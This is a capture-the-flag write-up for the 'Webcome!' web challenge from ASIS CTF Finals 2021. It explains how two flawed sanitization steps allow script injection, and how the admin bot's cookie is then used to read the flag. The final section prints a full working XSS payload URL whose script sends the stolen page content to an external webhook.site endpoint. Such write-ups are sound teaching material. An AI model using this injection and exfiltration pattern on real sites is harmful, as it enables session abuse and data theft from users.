---
layout: post
title: "[ASIS CTF Finals 2021] Webcome!"
author: alueft
---

## Problem description

This is the problem entitled "Webcome!" from
[ASIS CTF Finals 2021](https://ctftime.org/event/1416).

You are given a web page that contains a CAPTCHA and a message saying you can
get the flag by solving it and clicking a submit button, but you need a "secret
cookie" to actually retrieve the flag. The provided code demonstrates this in
its `/flag` endpoint, which checks that both a `secret_token` cookie exists and
is equal to an internal secret token, and a CAPTCHA token exists and is valid.

As commonly seen in web problems, there's a "report" function that makes the
server navigate to a user-provided URL, which presumably can be utilized in some
manner to get the flag. Notably, the secret token is set by the server as a
cookie before navigating to the URL. This means we could make the server
navigate to the `/flag` endpoint, but there's no way of getting it back for us
to read it - maybe there's something else we can do at a different endpoint?

## Exploiting the HTML index page

The relevant part of index.html, which is used for the `/` endpoint, looks like
the following:

```html
<body>
    <div id="cont">
        <pre id="msg">
            
        </pre>
        <br>
        <br>
        <form action="/flag" method="POST">
            <div class="g-recaptcha" data-sitekey="$SITEKEY$"></div>
            <br/>
            <br/>
            <input id="submitbtn" type="submit" value="Submit">
        </form>
    </div>
    <script>
        msg.innerText = '$MSG$';
    </script>
    <!-- Report bugs at /report -->
</body>
```

`msg` is populated by the server in Node like so:

```js
app.get('/',(req,res)=>{
    var msg = req.query.msg
    if(!msg) msg = `Yo you want the flag? solve the captcha and click submit.\\nbtw you can't have the flag if you don't have the secret cookie!`
    msg = msg.toString().toLowerCase().replace(/\'/g,'\\\'').replace('/script','\\/script')
    res.send(indexHtml.replace('$MSG$',msg))
})
```

The message can be manually specified as a GET query parameter. There is an
attempt made by the server to sanitize the given message, but there's two ways
of bypassing it to execute arbitrary JS:

1. Every occurrence of `'` is replaced with `\'`, which attempts to prevent
   ending the string assigned to `msg.innerText`. However, if we make the string
   begin with `\'`, then the replacement string will become `\\'`. This ends up
   escaping the second backslash rather than the single quotation mark, meaning
   we can now write whatever code we want.
1. There's a similar attempt to deter using `</script>` to end the JS block, but
   note that the first argument is a string, rather than a regex literal with a
   global flag. As a result, only the _first_ occurrence of `/script` is
   replaced, which allows us to use a second occurrence to exit the script and
   subsequently begin a new one.

OK, so we can use the report function to make the server navigate to its own
index page and execute arbitrary JS. The secret cookie is also included, so
if we can just get its value, then we can get in through the front door?

## We're not quite there yet...

The server is actually quite robust when navigating to the user-specified URL:

```js
const browser = await puppeteer.launch({ pipe: true,executablePath: '/usr/bin/google-chrome' })
const page = await browser.newPage()
await page.setCookie({
    name: 'secret_token',
    value: secretToken,
    domain: challDomain,
    httpOnly: true,
    secret: false,
    sameSite: 'Lax'
})

res.send("Bot is visiting your URL")
try{
    await page.goto(req.body.url,{
        timeout: 2000
    })
    await new Promise(resolve => setTimeout(resolve, 5e3));
} catch(e){}
await page.close()
await browser.close()
```

Notably, `sameSite: 'Lax'` means it'll only include the cookie required to read
the flag when navigating to its own domain (see reference
[here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite#lax)),
and `httpOnly: true` means it won't make the cookie accessible to JS executing
in the page (see reference
[here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)).

Thus, the cookie is only valid when we're navigating within the server's own
endpoints, and we can't read out its value in our own JS script and throw it out
to the outside world.

## Getting the flag (and reading it)

However, now that we're in a spot where we can execute JS in the server context,
navigating to the flag seems much more promising. Previously, we couldn't do
much by making the server navigate to the `/flag` endpoint, but now we can do it
ourselves!

This requires a couple steps to get past the CAPTCHA, because the server
makes a Google API call to validate the token:

1. We can actually just solve the CAPTCHA manually in a browser tab and call
   `grecaptcha.getResponse()` in the console to get the token. See
   [here](https://web.archive.org/web/20220106150713/https://developers.google.com/recaptcha/docs/verify)
   for CAPTCHA docs (linked to a place I trust not to change its URL more than
   Google's documentation).
1. If you scroll way up to where the original message sanitization is done,
   you'll see that `toLowerCase()` is called...which is annoying, because it's
   extremely likely that the CAPTCHA token contains uppercase letters. Luckily,
   we can specify the string as Unicode characters (e.g. `A` becomes `\u0041`),
   which doesn't require uppercase letters.

Once that's done, we can navigate to `/flag`, read the response, and then hit
some external endpoint to read the flag.

## Putting together the final plan

1. Do the CAPTCHA, get its token, and convert it to Unicode characters.
1. Create a script that:
   1. Navigates to the flag, with the CAPTCHA token in its request body.
   1. Reads the response.
   1. Navigates to some external endpoint, with the flag in its request body.
1. Add the necessary string to get past the server sanitization.
1. Put everything together into one line and use the report function.
1. Watch the external endpoint for an incoming request with the flag.

Here's the relevant script:

```js
fetch("http://[server IP]/flag", {
    method: "POST",
    body: "g-recaptcha-response=[snipped for brevity]",
    headers: {"Content-Type": "application/x-www-form-urlencoded"},
    credentials: "include",
})
.then(res => res.text())
.then(res => {
    fetch("[some external endpoint]", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: res,
    });
});
```

I used webhook.site as the external endpoint, and eventually got an incoming
request with the body `ASIS{welcomeeeeee-to-asisctf-and-merry-christmas}`. (Oh
yeah, this CTF ran for 24 hours over Christmas, which was not exactly convenient
for our team.)

And just for completeness, here's the URL I ended up getting the flag with,
which contains a ton of extra cruft:

```
http://65.21.255.24:5000/?msg=test';test/script</script><script>fetch("http://65.21.255.24:5000/flag", { method: "POST", body: "g-recaptcha-response=\u0030\u0033\u0041\u0047\u0064\u0042\u0071\u0032\u0035\u0071\u0062\u0036\u0074\u0073\u0037\u007a\u0037\u0041\u0032\u0050\u0043\u002d\u007a\u0036\u0059\u0071\u004a\u0063\u004a\u004e\u002d\u0064\u006d\u0075\u0059\u0076\u0046\u0063\u0049\u006f\u0064\u0071\u0049\u0042\u0075\u0049\u0055\u0068\u0067\u0054\u0062\u004f\u0045\u0033\u0079\u0030\u0079\u004d\u004c\u0050\u0055\u0039\u0078\u0048\u007a\u0038\u004f\u0047\u0042\u0053\u0036\u0047\u0049\u0042\u007a\u004d\u004a\u0067\u0054\u0061\u0037\u0063\u0077\u006d\u0064\u006e\u0069\u002d\u0036\u0047\u006b\u004c\u0055\u0071\u0078\u0030\u0062\u0051\u0031\u0055\u006f\u0051\u004f\u0074\u0057\u0076\u0047\u004d\u007a\u0071\u006c\u0059\u004b\u0053\u0055\u004e\u0070\u0032\u005a\u0067\u004b\u0056\u0057\u0054\u0061\u0039\u0061\u0073\u006a\u0048\u0033\u0056\u0034\u0076\u0039\u006c\u004b\u006d\u0059\u0038\u0038\u0045\u0056\u0033\u005f\u0067\u0046\u006a\u0035\u0042\u0072\u0050\u0039\u006c\u0054\u0069\u0043\u0050\u0052\u0042\u0032\u0061\u0076\u006f\u0044\u0066\u004e\u0073\u0031\u004c\u0053\u0042\u004f\u005a\u005f\u0039\u0039\u0071\u0030\u0033\u002d\u0078\u0032\u0063\u0078\u0037\u0069\u004f\u0039\u0071\u006d\u0077\u0035\u0071\u0066\u0074\u005a\u0042\u005a\u0030\u0076\u0036\u0043\u004b\u0036\u0042\u0062\u0034\u0051\u002d\u006b\u0032\u0053\u0031\u0033\u004b\u0059\u0077\u0051\u0049\u0061\u004a\u0063\u0064\u0056\u0079\u0038\u0074\u0048\u0041\u0070\u0076\u0047\u0031\u0072\u0056\u007a\u0059\u0035\u0070\u0049\u0071\u004d\u0047\u0078\u0052\u0032\u0052\u004b\u0075\u0047\u0058\u004d\u005f\u0066\u0052\u0068\u0039\u0061\u0068\u0064\u004d\u0057\u0066\u0075\u0077\u0054\u0072\u0033\u0063\u0057\u0054\u0078\u0038\u0071\u0034\u0046\u0038\u004b\u0076\u006b\u0069\u006f\u0066\u006c\u0077\u0065\u0041\u0072\u002d\u0064\u0038\u0046\u0048\u0062\u006a\u002d\u0067\u0039\u0034\u0030\u006d\u0068\u0050\u0031\u004e\u004d\u0057\u0048\u0048\u0042\u0054\u0069\u0076\u0044\u0068\u0044\u0067\u0045\u0051\u0044\u0034\u0031\u005a\u006b\u0037\u006d\u0073\u0030\u0050\u0051\u0057\u006b\u006d\u0069\u0062\u0053\u0070\u0064\u0055\u006a\u0057\u0067\u0070\u007a\u004f\u0069\u006e\u0063\u0037\u0065\u0047\u0039\u002d\u0035\u0039\u0035\u0078\u005a\u0066\u0050\u0033\u0079\u0053\u0062\u0049\u0063\u0036\u004d\u0044\u0064\u0077\u0071\u0030\u0062\u0053\u0068\u005a\u0072\u0030\u006f\u0064\u004a\u0067\u007a\u0076\u0054\u0036\u0076\u0067\u0065\u005f\u0066\u004d\u004a\u002d\u0043\u0045\u0038\u0038\u0054\u0047\u006d\u0067\u0050\u005a\u0073\u0076\u0037\u0047\u004f\u0030\u004e\u0050\u0035\u0054\u0066\u006a\u0034\u004f\u007a\u0039\u0046\u002d\u0035\u0065\u0069\u0072\u0069\u0042\u0038\u0050\u004a\u0059\u006d\u0050\u004a\u0048\u0053\u0034\u0071\u005a\u002d\u0079\u0067\u0039\u004f\u0073\u0073\u0072\u004c\u0066\u0066\u004d\u007a\u0073\u004c\u0039\u0053\u0034\u0079\u0044", headers: {"Content-Type": "application/x-www-form-urlencoded" }, credentials: "include" }).then(res => res.text()).then( res => { fetch("http://webhook.site/37af6202-11a5-447d-881e-7a2be9985895", {  method: "POST", headers: {"Content-Type": "application/json", "test": res}, body: res,}).then(res => {  console.log("Request complete! response:", res);}); });</script>
```
